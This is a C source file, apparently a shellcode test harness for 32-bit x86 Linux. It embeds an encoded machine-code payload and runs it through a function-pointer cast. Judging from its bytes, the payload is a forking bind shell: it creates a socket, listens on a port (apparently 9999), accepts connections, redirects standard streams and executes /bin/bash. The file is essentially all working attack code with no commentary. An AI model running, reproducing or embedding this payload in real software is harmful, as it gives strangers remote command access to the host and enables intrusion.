#include <stdio.h>
#include <string.h>
unsigned char shellcode[] = \
			    "\x31\xc0\xb0\x06\x50\xb0\x01\x50\xb0\x02\x50\xb0\x66\x31\xdb\xb3\x01\x89\xe1\xcd\x80\x89\xc6\x31\xdb\x53\x53\x53\xeb\x79\x31\xd2\x59\x8b\x09\x66\x89\xca\xc1\xe2\x10\xbb\xf2\x0f\x0f\xf0\x81\xe3\x0f\xf0\xf0\x0f\x01\xd3\x53\x89\xe3\x31\xc9\xb1\x10\x51\x53\x56\x89\xe1\x31\xdb\xb3\x02\x31\xc0\xb0\x66\xcd\x80\x31\xc0\x50\x56\x89\xe1\x31\xdb\xb3\x04\xb0\x66\xcd\x80\x31\xc0\xb0\x10\x50\x89\xe2\x83\xec\x10\x52\x83\xea\x10\x52\x56\x89\xe1\x31\xdb\xb3\x05\xb0\x66\xcd\x80\x83\xc4\x20\x89\xc7\x31\xc0\xb0\x02\xcd\x80\x31\xdb\x39\xd8\x74\x14\x31\xd2\x83\xec\x04\x89\xe1\x89\xc3\x31\xc0\xb0\x07\x83\xc4\x04\xeb\xc3\xeb\x32\x89\xfb\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\xb0\x3f\x41\xcd\x80\xb0\x3f\x41\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\xe8\x4e\xff\xff\xff\x27\x0f"
;

int main(){
        printf("Shellcode Length:  %d\n", strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}
